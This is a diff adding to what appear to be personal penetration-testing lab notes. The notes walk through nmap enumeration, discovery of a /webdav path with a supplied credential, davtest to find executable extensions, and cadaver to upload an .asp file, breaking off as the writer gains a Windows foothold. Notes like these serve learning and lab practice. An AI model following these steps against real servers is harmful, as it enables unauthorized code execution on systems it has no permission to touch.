@@ -13,4 +13,15 @@ STEPS:
 1 NMAP Enumeration :
      nmap -sV -sC $IP -vvvv
         sV - Service Version Detection for different services running on the IP
-        sC - Default Nmap script to check the 
+        sC - Default Nmap script to check the scripts
+        vvvv - verbose level
+2 nmap --script=http-enum $IP
+here FOUND /webdav 
+Authentication password is already given = bob:password_123321
+2:DAVTEST
+used davtest to find what are the extensions have execute functions
+      davtest -url http://$IP/webdav
+          here i found the .asp have execute rights
+3. CADAVER - Used to exploit the upload function .asp
+      cadaver $IP/webdav
+when i reload the website http://$IP/webdav i have the .asp extension from there i gained the windows 
